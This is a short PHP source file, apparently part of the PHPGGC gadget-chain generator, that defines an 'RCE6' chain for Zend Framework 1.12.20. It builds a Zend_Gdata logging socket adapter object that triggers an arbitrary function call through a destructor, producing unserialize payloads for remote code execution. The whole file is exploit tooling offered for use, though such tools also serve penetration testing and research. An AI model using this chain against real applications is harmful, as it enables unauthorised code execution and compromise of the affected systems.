<?php

namespace GadgetChain\ZendFramework;

class RCE6 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '1.12.20';
    public static $vector = '__destruct';
    public static $author = 'CyanM0un';

    public function generate(array $parameters)
    {
        $function = $parameters["function"];
        $parameter = $parameters["parameter"];

        return new \Zend_Gdata_App_LoggingHttpClientAdapterSocket($function, $parameter);
    }
}